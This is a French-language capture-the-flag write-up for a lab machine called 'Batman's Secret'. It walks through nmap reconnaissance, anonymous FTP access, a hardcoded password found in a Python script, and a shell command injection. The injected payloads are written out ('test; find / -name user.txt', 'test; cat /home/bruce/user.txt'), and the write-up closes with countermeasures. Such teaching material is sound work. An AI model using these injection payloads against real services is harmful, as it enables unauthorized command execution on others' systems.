---
author: Wallygator
date: 2026-10-06
version: 1.0.0
modification: Harmonisation du write-up
cve: Aucun CVE produit applicable ; CWE-78 et CWE-798
---

# Documentation : Batman's Secret (Partie 1 - User Flag)


# Documentation : Batman's Secret (Partie 1 - User Flag)

## 1. Contexte & Objectif

* **Cible** : `10.10.0.12`
* **Objectif** : Explorer la cible, identifier les services vulnérables et récupérer le drapeau contenu dans le fichier `user.txt`.

---

## 2. Reconnaissance (Nmap)

La première étape consiste à scanner la machine cible pour identifier les ports et services ouverts :

```bash
nmap -sC -sV 10.10.0.12

```

### Résultats du scan :

* **Port 21 / TCP (FTP)** : Service `vsftpd 3.0.5` avec la connexion anonyme autorisée (`Anonymous FTP login allowed`). Fichiers visibles : `alert.py` et un répertoire `logs/`.
* **Port 22 / TCP (SSH)** : OpenSSH.
* **Port 3000 / TCP** : Service personnalisé écoutant sous le nom de **« Gotham Hotline »** (`Gotham Hotline: Identify yourself.`).

---

## 3. Investigation & Analyse du Code Source

### A. Exploration FTP

Connexion au serveur FTP en tant qu'utilisateur anonyme :

```bash
ftp 10.10.0.12
# Login : anonymous
# Password : (Entrée)

```

Récupération du script Python `alert.py` :

```ftp
ftp> get alert.py
ftp> cd logs
ftp> ls
# Présence d'un fichier report.txt

```

### B. Analyse de `alert.py`

En examinant le contenu de `alert.py` (`cat alert.py`), deux éléments majeurs ont été découverts :

1. **Mot de passe d'authentification hardcodé** :
```python
if data == "G0th4mN33dsTh3B4t!":

```


2. **Vulnérabilité d'Injection de Commande (Command Injection)** :
```python
os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)

```


Le script prend l'entrée utilisateur (`alert_text`) et l'insère directement dans une commande système `bash` sans assainissement des données.

---

## 4. Exploitation & Analyse des Erreurs

### A. Erreurs rencontrées & Apprentissage

* **Confusion de contexte (FTP vs Shell)** : Tentative initiale d'exécuter des commandes spécifiques à l'outil FTP (comme `get` ou `cd`) directement dans l'injection du port 3000.
* *Leçon* : L'injection de commande communique avec un shell système Linux (`bash`), pas avec un client FTP.


* **Absence d'affichage direct dans le terminal Netcat** : La commande injectée s'exécutait bien sur la machine distante, mais la sortie n'apparaissait pas à l'écran car le script redirige tout (`>`) vers `/opt/hotline/logs/report.txt`.
* *Leçon* : Pour lire le résultat d'une commande injectée, il fallait télécharger le fichier `report.txt` mis à jour via le FTP anonyme.



### B. Phase d'Exploitation (Pas à Pas)

1. **Connexion au port 3000 via Netcat** :
```bash
nc 10.10.0.12 3000

```


2. **Authentification auprès de la hotline** :
```text
🦇 Gotham Hotline: Identify yourself.
$> G0th4mN33dsTh3B4t!

```


3. **Localisation du fichier `user.txt**` :
Envoi de la charge utile d'injection de commande :
```text
Authorized signal. What is the emergency?
$> test; find / -name user.txt 2>/dev/null

```


4. **Récupération du chemin dans `report.txt**` :
Via FTP anonyme, téléchargement et lecture de `report.txt` :
```text
/home/bruce/user.txt

```


5. **Lecture du drapeau** :
Nouvelle injection sur le port 3000 pour lire le fichier identifié :
```text
Authorized signal. What is the emergency?
$> test; cat /home/bruce/user.txt

```



---

## 5. Résolution Finale & Bilan

En téléchargeant une dernière fois le fichier `report.txt` depuis le serveur FTP anonyme et en l'affichant sur la machine locale (`cat report.txt`), le contenu du drapeau `user.txt` a été récupéré avec succès.

## 6. Contre-mesures

### FTP anonyme et secrets exposés

- Désactiver l'accès FTP anonyme et ne pas publier de scripts, logs ou fichiers de configuration.
- Isoler les fichiers de dépôt dans un répertoire dédié, en lecture seule si nécessaire.
- Ne jamais coder un mot de passe en dur dans un script ; utiliser un gestionnaire de secrets et faire une rotation après exposition.

### Injection de commande

- Ne pas construire une commande shell avec une entrée utilisateur concaténée dans `os.system`.
- Utiliser une API sans shell, comme `subprocess.run([...], shell=False)`, avec une validation par liste blanche.
- Écrire les logs dans un emplacement non exposé par FTP, avec un propriétaire et des permissions restrictifs.